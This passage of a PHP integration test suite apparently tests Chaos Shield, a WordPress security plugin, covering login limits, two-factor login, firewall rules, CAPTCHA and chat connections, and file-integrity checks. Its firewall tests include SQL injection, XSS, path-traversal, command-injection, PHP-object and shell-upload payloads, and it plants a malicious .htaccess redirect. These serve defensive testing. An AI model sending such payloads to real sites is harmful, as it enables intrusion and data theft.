<?php
/**
 * Integration tests: run against a live test site with `wp eval-file tests/run.php`.
 *
 * Every check drives the real site over HTTP (login, firewall, REST) or calls the
 * plugin's classes the way WordPress would. The site needs the test IP helper in
 * tests/fixtures/ as a must-use plugin so each test can act from its own IP.
 * Never run this on a production site: it creates users, bans IPs and plants a
 * harmless test file in the uploads folder (all removed at the end).
 *
 * @package ChaosShield
 */

// phpcs:disable WordPress.Security.EscapeOutput, WordPress.WP.AlternativeFunctions, WordPress.PHP.NoSilencedErrors, WordPress.WP.EnqueuedResources -- Command line test code.

namespace ChaosShield\Tests;

use ChaosShield\Accounts;
use ChaosShield\Alerts;
use ChaosShield\Api;
use ChaosShield\Attack_Mode;
use ChaosShield\Cloudflare;
use ChaosShield\Edge;
use ChaosShield\Exposure;
use ChaosShield\Https;
use ChaosShield\Page_Check;
use ChaosShield\Scripts;
use ChaosShield\Captcha;
use ChaosShield\Hub;
use ChaosShield\Connections;
use ChaosShield\Forwarder;
use ChaosShield\Bans;
use ChaosShield\Events;
use ChaosShield\Firewall;
use ChaosShield\Geo_Db;
use ChaosShield\Help;
use ChaosShield\Incidents;
use ChaosShield\Integrity;
use ChaosShield\Login_Guard;
use ChaosShield\Network;
use ChaosShield\Password_Policy;
use ChaosShield\Request;
use ChaosShield\Restore_Points;
use ChaosShield\Salts;
use ChaosShield\Backup;
use ChaosShield\Scanner;
use ChaosShield\Settings;
use ChaosShield\Siem;
use ChaosShield\Threat_Feed;
use ChaosShield\Totp;
use ChaosShield\Two_Factor;
use ChaosShield\Updater;

if ( ! defined( 'WP_CLI' ) || ! class_exists( '\ChaosShield\Settings' ) ) {
	echo "Run with: wp eval-file tests/run.php\n";
	return;
}

require_once __DIR__ . '/helpers.php';

// Known starting point, restored at the end.
$sst_settings = Network::get_option( Settings::OPTION );
$sst_key      = array( Network::get_option( Api::KEY_OPTION ), Network::get_option( Api::SCOPE ), Network::get_option( Api::SEALED ) );
$sst_s        = Settings::all();
$sst_s        = array_merge(
	$sst_s,
	array(
		'limit_login'          => true,
		'login_max_attempts'   => 5,
		'generic_login_errors' => true,
		'two_factor'           => true,
		'firewall'             => true,
		'auto_ban'             => true,
		'autoban_strikes'      => 3,
		'siem'                 => true,
		'captcha'              => false,
		'rate_limit'           => false,
		'country_block'        => false,
		'ip_allowlist'         => array(),
		'ip_blocklist'         => array(),
		'siem_rules_off'       => array(),
		'fw_mode'              => 'block',
		'fw_sensitivity'       => 'balanced',
		'fw_rules_off'         => array(),
		'attack_auto'          => false,
		'csp_mode'             => 'off',
		'force_https'          => false,
		'ban_feed'             => false,
	)
);
Network::delete_option( Attack_Mode::OPTION );
$sst_fw = Network::get_option( Firewall::EXCEPTIONS, array() );
Network::delete_option( Firewall::EXCEPTIONS );
Network::update_option( Settings::OPTION, $sst_s );
Settings::forget();

echo 'Chaos Shield ' . CSHIELD_VERSION . ' integration tests against ' . home_url( '/' ) . "\n";
$probe = http( 'GET', '/', ip() );
if ( 200 !== $probe['status'] ) {
	echo "The site did not answer with 200 ({$probe['status']}): start it first.\n";
	\WP_CLI::halt( 1 );
}

group(
	'Login limits',
	function () {
		$admin = user();
		$pass  = password( $admin );
		$bad   = ip();
		$max   = (int) Settings::get( 'login_max_attempts' );
		for ( $i = 0; $i < $max; $i++ ) {
			login( $admin->user_login, 'wrong-' . $i, $bad );
		}
		check( 'IP is locked out after ' . $max . ' failures', Login_Guard::locked_until( $bad ) > time() );
		check( 'the right password is refused while locked out', ! logged_in( login( $admin->user_login, $pass, $bad ) ) );
		$good = ip();
		check( 'the same account still logs in from another IP', logged_in( login( $admin->user_login, $pass, $good ) ) );
		check( 'that admin IP is now protected from bans', false === Bans::ban( $good, 'test' ) && ! Bans::until( $good ) );
		check( 'the server itself is never banned', false === Bans::ban( '127.0.0.1', 'test' ) && ! Bans::until( '127.0.0.1' ) );

		$c = ip();
		$a = login( 'sst_nobody_' . wp_rand(), 'x', $c );
		$b = login( $admin->user_login, 'x', $c );
		preg_match( '#<div id="login_error"[^>]*>(.*?)</div>#s', $a['body'], $ma );
		preg_match( '#<div id="login_error"[^>]*>(.*?)</div>#s', $b['body'], $mb );
		check( 'unknown user and wrong password show the same error', ! empty( $ma[1] ) && wp_strip_all_tags( $ma[1] ) === wp_strip_all_tags( $mb[1] ) );
	}
);

group(
	'Two-factor',
	function () {
		$user   = user();
		$pass   = password( $user );
		$secret = Totp::new_secret();
		update_user_meta( $user->ID, Two_Factor::META_SECRET, Totp::seal( $secret ) );
		$recovery = 'abcde12345';
		update_user_meta( $user->ID, Two_Factor::META_RECOVERY, array( wp_hash_password( $recovery ) ) );
		$from = ip();

		$res = login( $user->user_login, $pass, $from );
		check( 'the password alone does not log in', ! logged_in( $res ) );
		check( 'the password step sends the user to the code step', false !== strpos( $res['location'], 'action=cshield_2fa' ) );

		$wrong = http( 'POST', $res['location'], $from, array( 'body' => array( 'cshield_code' => '000000' === Totp::code( $secret, (int) floor( time() / 30 ) ) ? '111111' : '000000' ) ) );
		check( 'a wrong code is refused', ! logged_in( $wrong ) && false !== strpos( $wrong['body'], 'login_error' ) );

		$code = Totp::code( $secret, (int) floor( time() / 30 ) );
		$ok   = http( 'POST', $res['location'], $from, array( 'body' => array( 'cshield_code' => $code ) ) );
		check( 'the current code logs in', logged_in( $ok ) );

		$again  = login( $user->user_login, $pass, $from );
		$replay = http( 'POST', $again['location'], $from, array( 'body' => array( 'cshield_code' => $code ) ) );
		check( 'the same code cannot be used twice', ! logged_in( $replay ) );

		$third = login( $user->user_login, $pass, $from );
		check( 'a recovery code logs in once', logged_in( http( 'POST', $third['location'], $from, array( 'body' => array( 'cshield_code' => $recovery ) ) ) ) );
		$fourth = login( $user->user_login, $pass, $from );
		check( 'the recovery code is then used up', ! logged_in( http( 'POST', $fourth['location'], $from, array( 'body' => array( 'cshield_code' => $recovery ) ) ) ) );

		$forged = http(
			'POST',
			add_query_arg(
				array(
					'action' => 'cshield_2fa',
					'uid'    => $user->ID,
					'token'  => 'forged',
				),
				'/wp-login.php'
			),
			$from,
			array( 'body' => array( 'cshield_code' => Totp::code( $secret, (int) floor( time() / 30 ) + 1 ) ) )
		);
		check( 'a forged challenge token is rejected', ! logged_in( $forged ) );

		$xml = '<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>' . esc_html( $user->user_login ) . '</value></param><param><value>' . esc_html( $pass ) . '</value></param></params></methodCall>';
		$rpc = http( 'POST', '/xmlrpc.php', $from, array( 'body' => $xml ) );
		check( 'XML-RPC does not accept the password alone', false === strpos( $rpc['body'], 'isAdmin' ) );
	}
);

group(
	'Firewall and bans',
	function () {
		$from = ip();
		check( 'a normal search passes', 200 === http( 'GET', '/?s=garden+chairs', $from )['status'] );
		$attacks = array(
			'SQL injection'    => '/?id=1%20UNION%20SELECT%20user_pass%20FROM%20wp_users',
			'script injection' => '/?q=%3Cscript%3Ealert(1)%3C/script%3E',
			'path traversal'   => '/?file=../../../../etc/passwd',
			'double encoding'  => '/?id=1%2520union%2520select%2520password',
		);
		foreach ( $attacks as $name => $path ) {
			check( $name . ' is blocked', 403 === http( 'GET', $path, ip() )['status'] ); // phpcs:ignore WordPress.PHP.YodaConditions.NotYoda -- It is one; the sniff misreads the call.
		}
		check( 'an attack tool user agent is blocked', 403 === http( 'GET', '/', ip(), array( 'headers' => array( 'User-Agent' => 'sqlmap/1.8' ) ) )['status'] );

		$scanner = ip();
		for ( $i = 0; $i < 10; $i++ ) {
			http( 'GET', '/?id=' . $i . '%20UNION%20SELECT%201', $scanner );
		}
		check( 'ten firewall hits in an hour ban the IP', Bans::until( $scanner ) > time() );
		check( 'a banned IP is refused even for normal pages', 403 === http( 'GET', '/', $scanner )['status'] );

		$s                 = Settings::all();
		$friend            = ip();
		$s['ip_allowlist'] = array( $friend );
		Network::update_option( Settings::OPTION, $s );
		check( 'an allowlisted IP is never blocked', 200 === http( 'GET', '/?id=1%20UNION%20SELECT%201', $friend )['status'] );
		$enemy             = ip();
		$s['ip_allowlist'] = array();
		$s['ip_blocklist'] = array( $enemy );
		Network::update_option( Settings::OPTION, $s );
		check( 'a blocklisted IP is refused', 403 === http( 'GET', '/', $enemy )['status'] );
		$s['ip_blocklist'] = array();
		Network::update_option( Settings::OPTION, $s );

		$spoof = http(
			'POST',
			'/wp-login.php',
			'',
			array(
				'headers' => array( 'X-Forwarded-For' => '6.6.6.6' ),
				'body'    => array(
					'log' => 'sst_spoof',
					'pwd' => 'x',
				),
			)
		);
		$rows  = Events::query(
			array(
				'search' => 'sst_spoof',
				'limit'  => 1,
			)
		);
		check( 'a forged X-Forwarded-For header is ignored without a trusted proxy', $spoof['status'] && $rows && '6.6.6.6' !== $rows[0]['ip'] );
	}
);

group(
	'Smarter firewall',
	function () {
		$comment = function ( $text, $from, array $extra = array() ) {
			return http(
				'POST',
				'/wp-comments-post.php',
				$from,
				$extra + array(
					'body' => array(
						'comment'         => $text,
						'author'          => 'Sam',
						'email'           => 'sam@example.com',
						'comment_post_ID' => 1,
					),
				)
			);
		};
		check( 'an ordinary comment passes', 403 !== $comment( 'Lovely post. Select a union jack flag; it is great!', ip() )['status'] );
		$blocked = $comment( "x' UNION/**/SELECT user_pass FROM wp_users--", ip() );
		check( 'SQL injection in a form field is blocked', 403 === $blocked['status'] );
		preg_match( '/Reference: ([A-Z0-9]{8})/', $blocked['body'], $m );
		$hits = Firewall::hits();
		check( 'the block page shows a reference that matches the hit list', ! empty( $m[1] ) && $hits && $hits[0]['ref'] === $m[1] && 'POST:comment' === $hits[0]['hits'][0]['field'] );

		$json = http(
			'POST',
			'/?rest_route=/wp/v2/comments',
			ip(),
			array(
				'headers' => array( 'Content-Type' => 'application/json' ),
				'body'    => wp_json_encode( array( 'content' => '<img src=x onerror=alert(1)>' ) ),
			)
		);
		check( 'script injection in a JSON body is blocked', 403 === $json['status'] );
		check( 'a PHP object in a cookie is blocked', 403 === http( 'GET', '/', ip(), array( 'cookies' => array( 'cart' => 'O:8:"Exploit1":0:{}' ) ) )['status'] );
		check( 'double encoded traversal in the query is blocked', 403 === http( 'GET', '/?file=..%252f..%252f..%252fetc%252fpasswd', ip() )['status'] );
		check( 'command injection is blocked', 403 === http( 'GET', '/?host=' . rawurlencode( '8.8.8.8; whoami' ), ip() )['status'] );

		$upload = http(
			'POST',
			'/wp-comments-post.php',
			ip(),
			array(
				'headers' => array( 'Content-Type' => 'multipart/form-data; boundary=sstb' ),
				'body'    => "--sstb\r\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\r\nContent-Type: image/png\r\n\r\n<?php echo 1;\r\n--sstb--\r\n",
			)
		);
		check( 'uploading a PHP file is blocked', 403 === $upload['status'] );

		$editor  = user( 'editor' );
		$cookies = admin_cookies( $editor->ID );
		$heart   = http(
			'POST',
			admin_url( 'admin-ajax.php' ),
			ip(),
			array(
				'cookies' => $cookies,
				'body'    => array(
					'action' => 'heartbeat',
					'data'   => '<iframe src="https://www.youtube.com/embed/x"></iframe> <?php echo 1; ?>',
				),
			)
		);
		check( 'editors can save HTML and code in posts', 403 !== $heart['status'] );

		// A suspicious sign alone passes at Balanced and is blocked at Strict.
		$probe = '/?q=' . rawurlencode( 'see document.cookie for details' );
		check( 'a weak sign alone passes on Balanced', 200 === http( 'GET', $probe, ip() )['status'] );
		Settings::save_firewall( 'block', 'strict', array() );
		check( 'and is blocked on Strict', 403 === http( 'GET', $probe, ip() )['status'] );

		// Learning mode records without blocking.
		Settings::save_firewall( 'learn', 'balanced', array() );
		$learn = http( 'GET', '/?id=' . rawurlencode( '1 UNION SELECT 1' ), ip() );
		$hits  = Firewall::hits();
		check( 'learning mode lets the request through', 200 === $learn['status'] );
		check( 'and records what it would have blocked', $hits && 'logged' === $hits[0]['action'] );
		Settings::save_firewall( 'block', 'balanced', array() );

		// A rule switched off no longer fires.
		Settings::save_firewall( 'block', 'balanced', array( 'command' ) );
		check( 'a rule can be switched off', 200 === http( 'GET', '/?host=' . rawurlencode( '8.8.8.8; whoami' ), ip() )['status'] );
		Settings::save_firewall( 'block', 'balanced', array() );

		// Allowing a blocked request adds an exception for that rule, address and field only.
		$admin = user();
		if ( is_multisite() ) {
			grant_super_admin( $admin->ID );
		}
		$acookies = admin_cookies( $admin->ID );
		$me       = ip();
		$path     = '/contact/?sst_form=1';
		$first    = http( 'POST', $path, ip(), array( 'body' => array( 'snippet' => '<script>track()</script>' ) ) );
		preg_match( '/Reference: ([A-Z0-9]{8})/', $first['body'], $m );
		$page = http( 'GET', Network::admin_url( 'admin.php?page=chaos-shield&tab=firewall' ), $me, array( 'cookies' => $acookies ) );
		preg_match( '#name="_wpnonce" value="([a-f0-9]+)"#', $page['body'], $n );
		check( 'the Firewall tab lists the hit', 200 === $page['status'] && ! empty( $m[1] ) && false !== strpos( $page['body'], $m[1] ) );
		http(
			'POST',
			admin_url( 'admin-post.php' ),
			$me,
			array(
				'cookies' => $acookies,
				'body'    => array(
					'action'   => 'cshield_firewall',
					'_wpnonce' => isset( $n[1] ) ? $n[1] : '',
					'op'       => 'allow',
					'ref'      => isset( $m[1] ) ? strtolower( $m[1] ) : '',
				),
			)
		);
		check( 'after Allow, the same request passes', 403 !== http( 'POST', $path, ip(), array( 'body' => array( 'snippet' => '<script>track()</script>' ) ) )['status'] );
		check( 'but the rule still covers other fields', 403 === http( 'POST', $path, ip(), array( 'body' => array( 'other' => '<script>track()</script>' ) ) )['status'] );
		check( 'and other addresses under it', 403 === http( 'POST', '/contact/more/', ip(), array( 'body' => array( 'snippet' => '<script>track()</script>' ) ) )['status'] );
		$front = http( 'POST', '/?sst_form=2', ip(), array( 'body' => array( 'comment' => '<script>track()</script>' ) ) );
		preg_match( '/Reference: ([A-Z0-9]{8})/', $front['body'], $fm );
		check( 'a block on the front page never becomes an exception', ! empty( $fm[1] ) && false === Firewall::allow_reference( $fm[1] ) && 403 === http( 'POST', '/', ip(), array( 'body' => array( 'comment' => '<script>track()</script>' ) ) )['status'] );
		$sender = ip();
		$second = http( 'POST', '/shop/', $sender, array( 'body' => array( 'note' => '<script>track()</script>' ) ) );
		preg_match( '/Reference: ([A-Z0-9]{8})/', $second['body'], $sm );
		check( 'a reference only becomes an exception for the IP it blocked', ! empty( $sm[1] ) && false === Firewall::allow_reference( $sm[1], ip() ) && true === Firewall::allow_reference( $sm[1], $sender ) );
		check(
			'POST bodies the REST API reads are inspected too',
			403 === http( 'PUT', '/wp-json/wp/v2/posts/1', ip(), array( 'body' => 'content=' . rawurlencode( '<script>alert(1)</script>' ) ) )['status'] && 403 === http(
				'POST',
				'/wp-json/wp/v2/posts/1?_method=PUT',
				ip(),
				array(
					'body'    => 'title=' . rawurlencode( '1 UNION SELECT user_pass FROM wp_users' ),
					'headers' => array( 'Content-Type' => '' ),
				)
			)['status']
		);
		check( 'an attack after a long value is still found', 403 === http( 'POST', '/contact/', ip(), array( 'body' => array( 'msg' => str_repeat( 'a', 20000 ) . '<script>alert(1)</script>' ) ) )['status'] );
		check(
			'more form data than the firewall reads is refused',
			403 === http(
				'POST',
				'/contact/',
				ip(),
				array(
					'body' => array(
						'pad'     => str_repeat( 'a ', 140000 ),
						'comment' => 'hello',
					),
				)
			)['status']
		);
		check( 'attacks in form field names are found', 403 === http( 'POST', '/contact/', ip(), array( 'body' => array( '<script>alert(1)</script>' => 'x' ) ) )['status'] );
		check( 'a normal form still goes through', 403 !== http( 'POST', '/contact/', ip(), array( 'body' => array( 'name' => 'Sam', 'message' => str_repeat( 'Hello there. ', 400 ) ) ) )['status'] ); // phpcs:ignore WordPress.Arrays.ArrayDeclarationSpacing.AssociativeArrayFound -- Short test call.

		// PHP in uploads.
		Firewall::uploads_rule( true );
		check( 'the uploads rule can be added', Firewall::uploads_protected() );
		Firewall::uploads_rule( false );
		check( 'and removed again', ! Firewall::uploads_protected() );
	}
);

group(
	'Connections',
	function () {
		Settings::forget();
		$mock  = static function ( array $hosts ) {
			update_site_option( 'sst_http_mock', $hosts );
			update_site_option( 'sst_http_log', array() );
		};
		$log   = static function () {
			wp_cache_flush();
			return (array) get_site_option( 'sst_http_log', array() );
		};
		$saved = array(
			Network::get_option( Captcha::SECRET ),
			Network::get_option( 'cshield_hcaptcha_secret' ),
			Network::get_option( Connections::CHAT_URL ),
		);
		$key   = '0x4AAAAAAAsstTestKey000';
		$sec   = '0x4AAAAAAAsstTestSecret0000000000';

		$mock( array( 'challenges.cloudflare.com' => array( 'body' => '{"success":false,"error-codes":["invalid-input-secret"]}' ) ) );
		$bad = Connections::connect(
			'turnstile',
			array(
				'site_key' => $key,
				'secret'   => $sec,
				'url'      => '',
				'token'    => '',
			)
		);
		check( 'a wrong Turnstile secret is refused', is_wp_error( $bad ) && false !== strpos( $bad->get_error_message(), 'secret key is wrong' ) );
		update_site_option( 'sst_http_log', array() );
		$bad = Connections::connect(
			'turnstile',
			array(
				'site_key' => 'not-a-key',
				'secret'   => $sec,
				'url'      => '',
				'token'    => '',
			)
		);
		check( 'a malformed site key is refused before any request', is_wp_error( $bad ) && ! $log() );

		$mock( array( 'challenges.cloudflare.com' => array( 'error' => 'cURL error 6: Could not resolve host' ) ) );
		$off = Connections::connect(
			'turnstile',
			array(
				'site_key' => $key,
				'secret'   => $sec,
				'url'      => '',
				'token'    => '',
			)
		);
		check( 'an unreachable service asks before saving', is_wp_error( $off ) && 'cshield_unreachable' === $off->get_error_code() && ! Settings::enabled( 'captcha' ) );

		$mock( array( 'challenges.cloudflare.com' => array( 'body' => '{"success":false,"error-codes":["invalid-input-response"]}' ) ) );
		$ok = Connections::connect(
			'turnstile',
			array(
				'site_key' => $key,
				'secret'   => $sec,
				'url'      => '',
				'token'    => '',
			)
		);
		check( 'a right Turnstile secret connects and switches the CAPTCHA on', is_string( $ok ) && Captcha::active() && 'turnstile' === Captcha::provider(), is_wp_error( $ok ) ? $ok->get_error_message() : '' );
		check( 'the secret is stored encrypted', Network::get_option( Captcha::SECRET ) !== $sec && Totp::open( Network::get_option( Captcha::SECRET ) ) === $sec );
		Settings::save_login( array( 'login_slug' => '' ) );
		check( 'saving the login page keeps the connected key', Settings::get( 'turnstile_site_key' ) === $key );

		$hkey = '10000000-ffff-ffff-ffff-000000000001';
		$hsec = '0x' . str_repeat( 'a1', 20 );
		$mock(
			array(
				'api.hcaptcha.com' => array(
					'body'  => '{"success":true}',
					'match' => 'response=sst-good',
					'else'  => '{"success":false,"error-codes":["invalid-input-response"]}',
				),
			)
		);
		$ok = Connections::connect(
			'hcaptcha',
			array(
				'site_key' => $hkey,
				'secret'   => $hsec,
				'url'      => '',
				'token'    => 'sst-good',
			)
		);
		check( 'hCaptcha connects with a solved test challenge', is_string( $ok ) && false !== strpos( $ok, 'both keys' ) && 'hcaptcha' === Captcha::provider(), is_wp_error( $ok ) ? $ok->get_error_message() : '' );
		$sent = $log();
		check( 'the check sends the site key and token to hCaptcha', $sent && false !== strpos( $sent[0]['body'], 'sitekey=' . $hkey ) && false !== strpos( $sent[0]['body'], 'response=sst-good' ) );

		$page = http( 'GET', '/wp-login.php', ip() );
		check( 'the login page shows the hCaptcha widget', false !== strpos( $page['body'], 'class="h-captcha"' ) && false !== strpos( $page['body'], 'js.hcaptcha.com/1/api.js' ) );
		$u    = user( 'subscriber' );
		$pass = password( $u );
		$no   = login( $u->user_login, $pass, ip() );
		check( 'a login without the challenge is refused', empty( $no['cookies'][ LOGGED_IN_COOKIE ] ) && false !== strpos( $no['body'], 'security check' ) );
		$yes = http(
			'POST',
			'/wp-login.php',
			ip(),
			array(
				'body' => array(
					'log'                => $u->user_login,
					'pwd'                => $pass,
					'wp-submit'          => 'Log In',
					'h-captcha-response' => 'sst-good',
				),
			)
		);
		check( 'a login with a solved challenge goes through', ! empty( $yes['cookies'][ LOGGED_IN_COOKIE ] ), (string) $yes['status'] );
		$huge = login( $u->user_login, $pass, ip(), array( 'h-captcha-response' => 'sst-good' . str_repeat( 'x', 3000 ) ) );
		check( 'an oversized challenge token is refused without asking the service', empty( $huge['cookies'][ LOGGED_IN_COOKIE ] ) );

		Connections::disconnect( 'hcaptcha' );
		Settings::forget();
		check( 'disconnecting the CAPTCHA in use switches it off and deletes the secret', ! Settings::enabled( 'captcha' ) && ! Network::get_option( 'cshield_hcaptcha_secret' ) && '' === Settings::get( 'hcaptcha_site_key' ) );

		$bad = Connections::connect(
			'slack',
			array(
				'site_key' => '',
				'secret'   => '',
				'url'      => 'https://evil.example/hooks.slack.com/services/x',
				'token'    => '',
			)
		);
		check( 'a webhook on the wrong host is refused', is_wp_error( $bad ) );
		$mock( array( 'hooks.slack.com' => array( 'body' => 'ok' ) ) );
		$ok   = Connections::connect(
			'slack',
			array(
				'site_key' => '',
				'secret'   => '',
				'url'      => 'https://hooks.slack.com/services/T000/B000/sstsecret',
				'token'    => '',
			)
		);
		$sent = $log();
		check( 'Slack connects after a test message', is_string( $ok ) && 'slack' === Connections::chat() && $sent && false !== strpos( $sent[0]['body'], 'Chaos Shield is connected' ), is_wp_error( $ok ) ? $ok->get_error_message() : '' );
		check( 'the webhook address is stored encrypted and shown shortened', false === strpos( (string) Network::get_option( Connections::CHAT_URL ), 'sstsecret' ) && false === strpos( Connections::chat_hint(), 'sstsecret' ) );

		update_site_option( 'sst_http_log', array() );
		$settings                    = Settings::all();
		$settings['alert_incidents'] = true;
		Network::update_option( Settings::OPTION, $settings );
		Settings::forget();
		Alerts::send( 'alert_incidents', 'Test <!channel> alert', 'User <@here> & friends', 'sst-' . wp_rand() );
		$sent = $log();
		$data = $sent ? json_decode( $sent[0]['body'], true ) : array();
		check( 'alerts also go to the connected chat', isset( $data['text'] ) && false !== strpos( $data['text'], 'Test &lt;!channel&gt; alert' ) );
		check( 'chat alerts cannot ping the channel', isset( $data['text'] ) && false === strpos( $data['text'], '<!channel>' ) && false === strpos( $data['text'], '<@here>' ) );

		$discord = Connections::message( 'discord', '@everyone look', '[click](https://evil.example)' );
		check( 'Discord messages turn mentions and masked links off', array() === $discord['allowed_mentions']['parse'] && false === strpos( $discord['content'], '@everyone' ) && false === strpos( $discord['content'], '](' ) );
		$teams = Connections::message( 'teams', 'Title', 'Body' );
		check( 'Teams messages are Adaptive Cards', 'application/vnd.microsoft.card.adaptive' === $teams['attachments'][0]['contentType'] );
		$gchat = Connections::message( 'gchat', 'T', '<users/all>' );
		check( 'Google Chat messages cannot mention everyone', false === strpos( $gchat['text'], '<users/all>' ) );

		$mock(
			array(
				'hooks.slack.com' => array(
					'code' => 404,
					'body' => 'no_service',
				),
			)
		);
		$fail = Connections::send_chat( 'x', 'y' );
		$st   = Connections::chat_status();
		check( 'a failed chat delivery is recorded', is_wp_error( $fail ) && $st && ! $st['ok'] && false !== strpos( $st['error'], '404' ) );

		$admin = user();
		if ( is_multisite() ) {
			grant_super_admin( $admin->ID );
		}
		$cookie = admin_cookies( $admin->ID );
		$tab    = http( 'GET', Network::admin_url( 'admin.php?page=chaos-shield&tab=alerts' ), ip(), array( 'cookies' => $cookie ) );
		check( 'the alerts tab has the chat connections and their dialogs', false !== strpos( $tab['body'], 'id="cshield-connect-slack"' ) && false !== strpos( $tab['body'], 'data-connect-test="slack"' ) && false === strpos( $tab['body'], 'sstsecret' ) );
		$hard = http( 'GET', Network::admin_url( 'admin.php?page=chaos-shield&tab=hardening' ), ip(), array( 'cookies' => $cookie ) );
		check( 'the hardening tab has the CAPTCHA dialogs and no raw key fields', false !== strpos( $hard['body'], 'id="cshield-connect-hcaptcha"' ) && false === strpos( $hard['body'], 'cshield[turnstile_secret]' ) );
		preg_match( '#"connect":"([a-f0-9]+)"#', $tab['body'], $m );
		$nonce = isset( $m[1] ) ? $m[1] : '';
		$ajax  = static function ( array $body, array $cookies ) {
			return http(
				'POST',
				admin_url( 'admin-ajax.php' ),
				ip(),
				array(
					'body'    => $body,
					'cookies' => $cookies,
				)
			);
		};
		$r     = $ajax(
			array(
				'action'  => 'cshield_connect',
				'service' => 'slack',
				'op'      => 'disconnect',
			),
			$cookie
		);
		check( 'the connect endpoint needs a nonce', 200 !== $r['status'] || false === strpos( $r['body'], '"success":true' ) );
		$editor = user( 'editor' );
		$r      = $ajax(
			array(
				'action'      => 'cshield_connect',
				'service'     => 'slack',
				'op'          => 'disconnect',
				'_ajax_nonce' => $nonce,
			),
			admin_cookies( $editor->ID )
		);
		check( 'editors cannot change connections', false === strpos( $r['body'], '"success":true' ) );
		$r = $ajax(
			array(
				'action'      => 'cshield_connect',
				'service'     => 'slack',
				'op'          => 'disconnect',
				'_ajax_nonce' => $nonce,
			),
			$cookie
		);
		Settings::forget();
		check( 'an administrator can disconnect from the dialog', false !== strpos( $r['body'], '"success":true' ) && '' === Connections::chat(), $r['body'] );

		$mock(
			array(
				'discord.com' => array(
					'code' => 204,
					'body' => '',
				),
			)
		);
		$settings                    = Settings::all();
		$settings['forward_webhook'] = 'https://discord.com/api/webhooks/1/sst';
		Network::update_option( Settings::OPTION, $settings );
		Settings::forget();
		$done = Forwarder::deliver(
			array(
				array(
					'created'  => time(),
					'type'     => 'system',
					'severity' => 1,
					'user_id'  => 0,
					'ip'       => '',
					'message'  => 'Hello @everyone',
				),
			)
		);
		$sent = $log();
		$data = $sent ? json_decode( $sent[0]['body'], true ) : array();
		check( 'log forwarding to Discord sends content without mentions', true === $done && isset( $data['content'] ) && false === strpos( $data['content'], '@everyone' ) && array() === $data['allowed_mentions']['parse'] );

		delete_site_option( 'sst_http_mock' );
		delete_site_option( 'sst_http_log' );
		foreach ( array( Captcha::SECRET, 'cshield_hcaptcha_secret', Connections::CHAT_URL ) as $i => $name ) {
			$saved[ $i ] ? Network::update_option( $name, $saved[ $i ], false ) : Network::delete_option( $name );
		}
		Network::delete_option( Connections::CHAT_STATUS );
		Network::delete_option( Connections::CHECKED );
	}
);

group(
	'Critical file fingerprints',
	function () {
		Settings::forget();
		$saved  = Network::get_option( Integrity::OPTION );
		$files  = Integrity::files();
		$ht     = $files['.htaccess']['path'];
		$had_ht = is_file( $ht ) ? file_get_contents( $ht ) : null;
		$config = $files['wp-config.php']['path'];
		$cfg    = file_get_contents( $config );
		$dropin = WP_CONTENT_DIR . '/db-error.php';
		$events = static function () {
			global $wpdb;
			return (int) $wpdb->get_var( $wpdb->prepare( 'SELECT COUNT(*) FROM ' . Events::table() . ' WHERE action = %s', 'integrity.changed' ) ); // phpcs:ignore WordPress.DB.DirectDatabaseQuery, WordPress.DB.PreparedSQL.NotPrepared -- Test reads the plugin's own table.
		};
		check( 'wp-config.php, .htaccess, drop-ins and core files are watched', isset( $files['wp-config.php'], $files['wp-content/object-cache.php'], $files['wp-settings.php'], $files['wp-content/uploads/.htaccess'] ) );
		try {
			if ( null !== $had_ht ) {
				unlink( $ht );
			}
			Network::delete_option( Integrity::OPTION );
			Integrity::check();
			check( 'the first check takes fingerprints without reporting anything', ! Integrity::changed() && Integrity::state()['checked'] > 0 );
			$rec = Integrity::state()['files']['wp-settings.php']['base'];
			check( 'each fingerprint has SHA-256 and MD5', hash_file( 'sha256', ABSPATH . 'wp-settings.php' ) === $rec['sha256'] && md5_file( ABSPATH . 'wp-settings.php' ) === $rec['md5'] );

			file_put_contents( $ht, "# sst original\nOptions -Indexes\n" );
			$changed = Integrity::check();
			$state   = Integrity::state()['files']['.htaccess'];
			check( 'a new .htaccess is reported', in_array( '.htaccess', $changed, true ) && 'new file' === Integrity::describe( $state ) );
			Integrity::accept( '.htaccess' );
			check( 'accepting makes it the fingerprint', ! Integrity::changed() );

			$before = $events();
			file_put_contents( $ht, "# sst original\nOptions -Indexes\nRewriteRule ^ https://evil.example/ [R=302,L]\n" );
			Integrity::check();
			check( 'a changed .htaccess is reported and logged as critical', isset( Integrity::changed()['.htaccess'] ) && $events() === $before + 1 );
			Integrity::check();
			check( 'the same change is not reported twice', $events() === $before + 1 && isset( Integrity::changed()['.htaccess'] ) );

			$admin = user();
			if ( is_multisite() ) {
				grant_super_admin( $admin->ID );
			}
			$tab = http( 'GET', Network::admin_url( 'admin.php?page=chaos-shield&tab=scan' ), ip(), array( 'cookies' => admin_cookies( $admin->ID ) ) );
			check( 'the scan tab shows the change line by line', false !== strpos( $tab['body'], 'id="cshield-integrity"' ) && false !== strpos( $tab['body'], 'evil.example' ) && false !== strpos( $tab['body'], 'diff-addedline' ) );

			$points = count( Restore_Points::all() );
			$put    = Integrity::restore( '.htaccess' );
			check( 'putting it back restores the accepted copy and saves a restore point', true === $put && "# sst original\nOptions -Indexes\n" === file_get_contents( $ht ) && count( Restore_Points::all() ) === $points + 1 && ! Integrity::changed() );

			Integrity::expect( '.htaccess' );
			file_put_contents( $ht, "# sst original\n# permalinks\n" );
			Integrity::check();
			check( 'a change WordPress makes on request is accepted', ! Integrity::changed() );
			file_put_contents( $ht, "# sst original\n# permalinks\nRewriteRule ^ http://evil.example [R]\n" );
			Integrity::check();
			Integrity::expect( '.htaccess' );
			file_put_contents( $ht, "# sst original\n# permalinks\nRewriteRule ^ http://evil.example [R]\n# planned\n" );
			Integrity::check();
			check( 'a planned change cannot hide one already waiting for review', isset( Integrity::changed()['.htaccess'] ) );
			Integrity::accept( '.htaccess' );
			check( 'every quoted value in a config line is hidden', "define( 'SST_X', '••••••' ); \$y = '••••••';" === Integrity::mask( "define( 'SST_X', 'abc' ); \$y = 'AKIA0SECRET';" ) );

			file_put_contents( $config, $cfg . "\ndefine( 'SST_TEST_KEY', 'sst-super-secret' ); // sst\n" );
			Integrity::check();
			$entry = Integrity::state()['files']['wp-config.php'];
			$lines = Integrity::config_changes( $entry );
			$shown = implode( "\n", (array) $lines );
